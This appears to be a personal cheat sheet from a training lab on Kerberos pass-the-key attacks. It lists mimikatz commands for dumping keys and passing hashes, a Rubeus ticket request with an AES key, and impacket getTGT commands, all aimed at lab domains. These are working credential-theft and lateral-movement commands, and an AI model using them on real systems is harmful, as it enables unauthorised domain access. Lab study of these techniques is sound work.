- [ ] Harvesting Kerberos keys from Windows
- [ ] PTK Windows
- [ ] PTK Linux

Harvesting Kerberos keys from Windows!!!
```powershell
sekurlsa::ekeys
```
PTK Windows!!!
```powershell
# 1-mimikatz
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f

sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /aes256:xxxxxx
# 2-Rubeus
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
![[Pasted image 20251110220652.png]]
PTK Linux!!!
```sh
# rc4 | ntlm
impacket-getTGT -hashes ':c39f2beb3d2ec06a62cb887fb391dee0' inlanefreight.htb/david
# aes
getTGT.py cicada.vl/administrator@dc-jpq225.cicada.vl -aesKey ''
```
References!!!
[Rubeus Over Pass The Hash Examples](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)